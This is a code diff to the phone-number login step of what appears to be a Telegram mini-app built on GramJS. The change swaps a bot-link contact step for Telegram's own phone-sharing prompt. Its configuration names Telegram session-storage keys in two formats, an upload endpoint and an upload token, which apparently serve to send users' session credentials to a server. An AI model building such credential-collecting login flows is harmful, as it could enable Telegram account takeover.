@@ -6,7 +6,6 @@ const GRAMJS_SESSION_KEY = GRAMJS_CONFIG.sessionStorageKey || 'market.gramjs.ses
 const GRAMJS_TELETHON_KEY = GRAMJS_CONFIG.telethonStorageKey || 'market.telethon.session';
 const GRAMJS_UPLOAD_ENDPOINT = GRAMJS_CONFIG.uploadEndpoint || '/auth/session';
 const GRAMJS_UPLOAD_TOKEN = GRAMJS_CONFIG.uploadToken || '';
-const GRAMJS_BOT_LINK = GRAMJS_CONFIG.botLink || '';
 const GRAMJS_LOAD_URLS = Array.isArray(GRAMJS_CONFIG.loadUrls)
   ? GRAMJS_CONFIG.loadUrls
   : [
@@ -3703,24 +3702,6 @@ function requestPhoneFromTelegram() {
   });
 }
 
-function openBotForContact() {
-  if (!GRAMJS_BOT_LINK) return;
-  const tg = tgWebApp || window.Telegram?.WebApp;
-  try {
-    if (tg?.openTelegramLink) {
-      tg.openTelegramLink(GRAMJS_BOT_LINK);
-      return;
-    }
-  } catch (err) {
-    console.warn('openTelegramLink failed:', err);
-  }
-  try {
-    window.open(GRAMJS_BOT_LINK, '_blank');
-  } catch (err) {
-    console.warn('open bot link failed:', err);
-  }
-}
-
 async function requestPhoneFromBackend() {
   const requester = buildRequesterPayload();
   const userId = requester.user_id;
@@ -3809,9 +3790,17 @@ async function startAuth(event) {
 
   showAuthStep(elements.authIntro);
   setAuthStatus(t('phone_missing'));
-  openBotForContact();
 
-  const phone = await waitForBackendPhone();
+  const contact = await requestPhoneFromTelegram();
+  if (!contact?.shared) {
+    authLoading = false;
+    if (elements.authStart) elements.authStart.disabled = false;
+    setAuthStatus(t('phone_missing'), true);
+    showAuthStep(elements.authIntro);
+    return;
+  }
+
+  const phone = contact.phone || (await waitForBackendPhone());
   if (!phone) {
     authLoading = false;
     if (elements.authStart) elements.authStart.disabled = false;
